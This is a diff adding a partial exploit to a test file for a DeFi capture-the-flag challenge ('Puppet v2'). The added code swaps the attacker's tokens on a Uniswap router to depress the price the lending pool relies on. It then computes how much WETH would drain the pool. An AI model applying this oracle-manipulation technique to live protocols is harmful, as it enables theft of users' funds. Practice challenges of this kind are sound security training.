@@ -82,6 +82,41 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const token = await this.token.connect(attacker);
+        const uni = await this.uniswapRouter.connect(attacker);
+        const pool = await this.lendingPool.connect(attacker);
+        const weth = await this.weth.connect(attacker);
+
+        let tx = await token.approve(uni.address,ATTACKER_INITIAL_TOKEN_BALANCE);
+        await tx.wait();
+
+        const path = [token.address,await uni.WETH()];
+        
+        console.log(path);
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 3;
+
+        tx = await uni.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.utils.parseEther("1")),
+            ethers.utils.parseEther("5"),
+            path,
+            attacker.address,
+            deadline
+        );
+
+        await tx.wait();
+
+       // const filter = weth.filters.Transfer(null, attacker.address);
+
+        //weth.on("Transfer",(data) => console.log(data));
+
+        const amount = await pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log(
+            "amount needed to empty the pool in ether: ",
+            (amount.div(ethers.utils.parseEther("1"))).toString()
+        );
+
+       // weth.removeAllListeners();
     });
 
     after(async function () {
